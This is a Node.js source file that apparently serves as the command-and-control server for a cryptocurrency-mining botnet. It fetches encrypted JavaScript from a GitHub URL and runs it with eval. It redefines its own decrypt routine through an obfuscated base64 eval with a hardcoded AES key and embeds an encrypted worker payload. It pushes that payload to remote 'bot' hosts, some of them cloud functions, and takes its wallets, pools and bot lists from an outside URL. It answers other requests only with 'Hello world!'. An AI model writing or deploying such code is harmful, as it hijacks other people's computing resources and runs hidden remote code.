'use strict';
const request = require('request');
const net = require('net');
const CryptoJS = require("crypto-js");
const express=require('express');
const app=express();
const bodyParser=require('body-parser');
app.parser=bodyParser.urlencoded({extended:true});
app.use(express.json({limit:'50mb'}));
app.use(express.urlencoded({limit:'50mb',extended:true}));
app.get('/',function(req,res) { mm.get(req,res) });
app.post('/',app.parser,function(req,res) { mm.post(req,res) });
app.listen(process.env.PORT||5000, () => { mm.log({host:require('./package.json').host,color:'#8ED76C',msg:'start' }) })

var main = function() {
  var self = this

  var cluster = {
    id: Number(require('./package.json').host[15]),
    peer: require('./package.json').host.split(''),
    rec: false
  }
  cluster.peer[15] = cluster.id == 1 ? '2' : '1';
  cluster.peer = cluster.peer.join('');

  var active = false;
  var m = new Date().getMinutes();

  var db = {
    state: 'orange', wallet: '*',
    summary: [
      ['*'], [require('./package.json').host], ['0 h/s'],
      ['0/0/0/0'], ['0/0/0/0'], [CryptoJS.MD5(main.toString()).toString()]
    ],
    pools: { backgrounds: [], hashes: [] },
    bots: { backgrounds: [], hashes: [] },
    tmp: { values: [], backgrounds: [] },
    log: { values: [], backgrounds: [] }
  }

  var gg = { rec: false };
  var pools = []; var bots = []; var yellow_pools = true;
  var decrypt = function(x){ return Buffer.from(x,'base64').toString('ascii') };

  setInterval(function() {
    m = new Date().getMinutes();
    active = (cluster.id == 1 && m < 30) || (cluster.id == 2 && m >= 30);
    
    var p1 = cluster.id == 1 && m == 0; if(!p1) p1 = cluster.id == 2 && m == 30;
    if(!cluster.rec && p1) {
      cluster.rec = true;
      request(require('./package.json').host, function(err, res, body) { cluster.rec = false });
    }
    
    var p2 = cluster.id == 1 && m == 29; if(!p2) p2 = cluster.id == 2 && m == 59;
    if(!cluster.rec && p2) {
      cluster.rec = true;
      request(cluster.peer, function(err, res, body) {
        if(body == 'Hello world!') {
          var data = { bots: [] }; for(var i=0; i<bots.length; i++) data.bots.push([bots[i].host])
          request.post({ url: cluster.peer, form: data, json: true }, function(err, res, body) { cluster.rec = false })
        }
        else cluster.rec = false
      });
    }
  
    var hsum = 0; var hsub = 0; var hacp = 0;  var rt = false;
  
    db.pools = { backgrounds: [], hashes: [] }
    db.summary[3][0] = '0/0/0/0';
    for(var i=0; i<pools.length; i++) {
      dbplus('pools',pools[i]);
      hsub += Number(pools[i].hash.split('/')[0]);
      hacp += Number(pools[i].hash.split('/')[1]);
      rt = pools[i].state == 'red' ? true: rt;
    }
  
    db.bots = { backgrounds: [], hashes: [] }
    db.summary[4][0] = '0/0/0/0'
    for(var i=0; i<bots.length; i++) {
      var ta = bots[i].hash.split(' '); bots[i].hash = ta[0]+' h/s '+ta[2];
      if(bots[i].wakecount) { bots[i].wakecount--;  bots[i].hash += ' - '+bots[i].wakecount+' sec' }
      dbplus('bots',bots[i]);
      hsum += Number(bots[i].hash.split(' ')[0]);
      rt = bots[i].state == 'red' ? true: rt
    }
  
    db.state = rt ? 'orange' : hsum == 0 ? 'yellow' : 'green'
    db.summary[2] = [(active ? hsum : 0)+' h/s '+hsub+'/'+hacp+' - '+(cluster.id == 1 ? 30-m : 60-m)+' min'];
  
    if(active && !gg.rec && gg.url) {
      gg.rec = true;
      db.log = db.tmp; db.tmp = { values: [], backgrounds: [] };
      request.post({ url: gg.url, form: JSON.stringify(db), json: true, followAllRedirects: true },
      function(error, response, body) {
        if(error) { self.log({host:'google',color:'#F8516A',msg:error.message}); gg.rec = false }
        else if(!body.yellow_pools) { self.log({host:'google',color:'#F8516A',msg:'body is wrong (data): '+body}); gg.rec = false }
        else {
          var tasks = []; yellow_pools = body.yellow_pools == 'ON';
          if(body.wallet && body.wallet != db.wallet) {
            db.wallet = body.wallet; self.log({host:'new wallet',msg:db.wallet});
            if(!body.pools) { var list = []; for(var i=0; i<pools.length; i++) list.push([pools[i].host]); tasks.push(update_pools(list)) }
          }
  
          if(body.pools) tasks.push(update_pools(body.pools));   
          if(body.bots) update_bots(body.bots);
  
          Promise.all(tasks).then(msgs => { gg.rec = false });
        }
      })
    }
  }, 1000);

  function update_pools(list) {
    return new Promise((resolve, reject) => {
      var p1 = []; for(var i=0; i<list.length; i++) p1.push(list[i][0]);
      var p2 = []; for(var i=0; i<pools.length; i++) p2.push(pools[i].host);
      if(JSON.stringify(p1) == JSON.stringify(p2)) resolve(true)
      else {
        var tasks = [];
        for(var i=0; i<pools.length; i++) tasks.push(pools[i].close());
        Promise.all(tasks).then(msgs => {
          for(var j=0; j<msgs.length; j++) self.log({host:msgs[j],msg:'del pool'})
          pools = [];
          for(var j=0; j<p1.length; j++) {
            pools.push(new gg.mycoin({ wallet: db.wallet, host: p1[j] }));
            self.log({host:p1[j],msg:'add pool'})
          }
          resolve(true)
        });
      }
    })
  }

  function update_bots(list) {
    var b1 = []; for(var i=0; i<list.length; i++) b1.push(list[i][0]);
    var b2 = []; for(var i=0; i<bots.length; i++) b2.push(bots[i].host);
    if(JSON.stringify(b1) == JSON.stringify(b2)) return false
    else {
      for(var i=0; i<bots.length; i++) {
        if(bots[i].wakeup) clearTimeout(bots[i].wakeup);
        self.log({host:bots[i].host,msg:'del bot'})
      }
      bots = [];
      for(var i=0; i<b1.length; i++) {
        let nbot={host:b1[i], state:'orange', hash:'0 h/s [0/0]'};
        bots.push(nbot); wakeup(nbot);
        self.log({host:b1[i],msg:'add bot'});
      }
      return true
    }
  }

  function dbplus(name,obj) {
    var a = name == 'pools' ? db.summary[3][0].split('/') : db.summary[4][0].split('/')
    a[['red','orange','yellow','green'].indexOf(obj.state)]++
    db[name].backgrounds.push([obj.state])
    if(name == 'pools') db.summary[3][0] = a.join('/')
    else db.summary[4][0] = a.join('/');
    db[name].hashes.push([obj.hash]);
  }

  function wakeup(bot) {
    bot.msg = "wakeup";
    bot.wakeup = setTimeout(function() { onmsg(bot) }, 60000);
    bot.wakecount = 60
  }

  function onmsg(bot) {
    delete bot.wakeup; delete bot.wakecount;
    if(Object.prototype.toString.call(bot.msg).slice(0,-1).split(' ')[1] == 'Array')
      for(var i=0; i<pools.length; i++) for(var j=0; j<bot.msg.length; j++) {
        if(pools[i].job && pools[i].job.job.job_id == bot.msg[j].job_id) {
          pools[i].mysubmit(bot.msg[j]);
          break;
        };
      };
  
    let jobs = []; for(var i=0; i<pools.length; i++) if(pools[i].job) jobs.push(pools[i].job);
    if (!active || jobs.length == 0) wakeup(bot)
    else {
      var data = { jobs: jobs };
      request.post({url:bot.host+'/worker',form:{jobs:jobs},json:true },
        function(error, response, body) {
          if(body && body.toString().includes('Cannot POST'))
            request.post({url:bot.host,form:{worker:gg.worker},json:true},function(error,response,body){botdb(error,body)})
          else botdb(error,body,true)
        }
      )
    }

    function botdb(error,body,next) {
      if(error) bot.msg=error.message
      else if(!body) bot.msg='body is empty'
      else if(body.error) bot.msg=body.error
      else if(!body.state) bot.msg='body is wrong'
      else {
        bot.state = body.state;
        bot.hash = body.hash;
        bot.msg = body.msg;
        if(next) return onmsg(bot);
        else {
          self.log({host:bot.host,msg:bot.msg})
          return wakeup(bot)
        }
      }
      self.log({host:bot.host,color:'#F8516A',msg:bot.msg})
      if(bot.msg == 'body is wrong' && bot.host.includes('cloudfunctions.net')) bot.state = 'orange'
      else bot.state = 'red'; 
      bot.hash = '0 h/s '+bot.hash.split(' ')[2];
      wakeup(bot)
    }
  }

  function init(body,callback) {
    var coin = body.init
    request( require('./package.json').github+coin+".js", function(err, res, body) {
      if(err) callback('error git_1: '+err.message)
      else if(body == '404: Not Found') callback('error git_1: '+body)
      else {
        eval(decrypt(body));
        request( require('./package.json').github+"superbot.js", function(err, res, body) {
          if(err) callback('error git_2: '+err.message)
          else if(body == '404: Not Found') callback('error git_2: '+body)
          else {
            gg.superbot = decrypt(body);
            gg.worker = gg.superbot+'\n'+decrypt(`
U2FsdGVkX1+jx85xnfAYQZbP9lISexUSlyG05d6xBEmWfIt9f2XFcrnwMJDvQIZA0Rj10NLuOrTJdBzxeqrVkfdrc3l0IGlTwy6X1b07miaY/Zm84VW8Ys5NWclae8zDjdkYi8gk13Tp8kc9StlVxTWeVGqDUsuT
GTk5oGoD0yskh5az4+WjmLYuLQPB22kf8sgShFgxfu5rs6qhmrsXSkSL/xlA9AqhcWya7x32ieYXselAPZ1mbYIR2Ea7VL8/UE0b+GrPC2+30DNZnLTFKIuazr9oC6K9OE2PLwig0yfyLKJqNJSLOP8vwY1KeHom
agrwK1Qoaiiw//rGNdNIZA4RBtcHWdbuMrkxGItLMWr8UyiWx7FJ2CSiuSdeTvhT55VcVVYRTO2a2XRJdRytyXHk4mpQtFjIW0dNdq8MeESHSduKfBPZbGiXM1JhxPBFfDvo6VJa3c8umUwGa96uI3bP/J4UzEpl
DuwGYzwWyuLYxpXxRAhXxzqlbwM/HdmIS3vqh71dCTektrzIooA7tRh4tKDVUNVILVgNC4m9DF+IJOsHomGOs7zHIXk1c3/0qs6M7bgZ0H6VmEKCIVUr6pm7uFKrz5MVGhIlSbP6IptWyybE9ORC0PFxPvt/Ih3s
ZJVF1ep7ksbxF0nrNia1Hm3cQL0hifx4mp5/G2JhdLI/xcxLkhA3oPulryJOYETtQZw0q7VAih8tCYeuqnDzJ2ZFEYQPv2sIfkjQzPvpCi2eZceq30TGSG836aiyYjNq0MsS9VLRuXMx1zN/8nqc6tWwGa8/rz9Q
vScvrDWM/7Fjm9Ixj1rfsJTYeUBt9ppkdSyirV50xwgg/e5wa2UAC1BgAwqIy9ho9ZSoLjqOIADw+V7YQZVBxnOXDC20UVprO7xm0rcoMWm2K4ma01vXnUQhy1f1z1aqAVgSxgRE9eJX5g21zNoVi5X2XC9f7VjC
59j0bv3foy4ZH99XDP1Orc80MXr0/DenClJba8ce/kyav21aiZ8Y4GvF1oiC3j8+`);
            callback('init '+coin );
          }
        })
      }
    })
  }

  this.get = function(req,res) {
    if(req.query.id) {
      gg.url = Buffer.from(req.query.id,'base64').toString('ascii');
      res.json({values:db.summary, state:db.state})
    }
    else res.send('Hello world!')
  }

  this.post = function(req,res) {
    if(req.body.init) {
      init(req.body, function(msg){
        var data = { msg: msg }
        if(msg.includes('error')) self.log({host:require('./package.json').host,color:'#F8516A',msg:msg});
        else {
          self.log({host:require('./package.json').host,color:'#8ED76C',msg:msg});
          data.wallet = db.wallet;
          data.pools = { values: [] }; for(var i=0; i<pools.length; i++) data.pools.values.push([pools[i].host]);
          data.push = {log: db.log};
          db.log = { values: [], backgrounds: [] };
        }
        res.json(data)
      })
    }
    else if(req.body.bots) res.send(update_bots(req.body.bots))
  }

  this.log = function(data) {
    db.tmp.values.push([new Date().toLocaleString(),data.host,data.msg]);
    if(!data.color) data.color = null;
    else console.log(JSON.stringify(data))
    db.tmp.backgrounds.push([data.color,data.color,data.color]);
  }

  var glob = function(x) { eval(decrypt(x.substring(-~[]))) }
  ('AZGVjcnlwdCA9IGZ1bmN0aW9uKHgpeyByZXR1cm4gQ3J5cHRvSlMuQUVTLmRlY3J5cHQoeC5zcGxpdCgnXG4nKS5qb2luKCcnKSwnMTIzNDUnKS50b1N0cmluZyhDcnlwdG9KUy5lbmMuVXRmOCkgfQ==');

}

var mm = new main()
